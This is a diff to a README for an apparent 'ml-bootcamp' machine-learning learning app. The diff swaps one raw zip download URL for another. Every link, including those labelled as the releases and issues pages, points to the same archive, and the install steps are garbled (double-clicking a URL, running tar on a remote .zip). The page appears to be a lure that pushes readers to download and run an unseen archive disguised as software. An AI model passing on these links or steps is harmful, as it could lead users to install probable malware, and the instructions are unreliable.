@@ -1,6 +1,6 @@
 # 🚀 ml-bootcamp - Learn Machine Learning Easily
 
-[![Download ml-bootcamp](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip)](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip)
+[![Download ml-bootcamp](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip)](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,29 +8,29 @@ Welcome to the ml-bootcamp! This free and interactive bootcamp teaches you the b
 
 ## 📥 Download & Install
 
-To get started, please visit the [Releases page](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip) to download the latest version of the ml-bootcamp software. 
+To get started, please visit the [Releases page](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip) to download the latest version of the ml-bootcamp software. 
 
 1. Click on the link above.
 2. Look for the latest release at the top of the page.
 3. Download the suitable file for your operating system. Here are the options:
 
-   - **Windows**: Download `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip`
-   - **macOS**: Download `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip`
-   - **Linux**: Download `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip`
+   - **Windows**: Download `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip`
+   - **macOS**: Download `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip`
+   - **Linux**: Download `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip`
 
 Once downloaded, follow the steps below based on your operating system.
 
 ### 🖥️ For Windows Users
 
 1. Locate the downloaded file, usually in your "Downloads" folder.
-2. Double-click on `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip`.
+2. Double-click on `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip`.
 3. Follow the on-screen instructions to complete the installation.
 4. Once installed, you can find ml-bootcamp in your Start Menu.
 5. Click on it to begin your machine learning journey.
 
 ### 🍏 For macOS Users
 
-1. Find the downloaded `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip` file in your "Downloads" folder.
+1. Find the downloaded `https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip` file in your "Downloads" folder.
 2. Double-click on the file to open it.
 3. Drag the ml-bootcamp icon into your Applications folder.
 4. Open your Applications and click on ml-bootcamp to start.
@@ -44,7 +44,7 @@ Once downloaded, follow the steps below based on your operating system.
    ```
 3. Extract the downloaded file using:
    ```
-   tar -xzf https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip
+   tar -xzf https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip
    ```
 4. Change into the extracted directory:
    ```
@@ -102,7 +102,7 @@ Learning machine learning is exciting. Don’t hesitate to ask questions if you 
 
 ## 🌟 Feedback
 
-Your opinion matters. Please share your experience with the ml-bootcamp. It helps us improve and provide better resources for future learners. You can submit your feedback directly through the application or via our [issues page](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/globuliform/ml-bootcamp.zip).
+Your opinion matters. Please share your experience with the ml-bootcamp. It helps us improve and provide better resources for future learners. You can submit your feedback directly through the application or via our [issues page](https://raw.githubusercontent.com/YASOLG/ml-bootcamp/main/exams/ml_bootcamp_3.6.zip).
 
 ## 🧑‍🤝‍🧑 Community
 
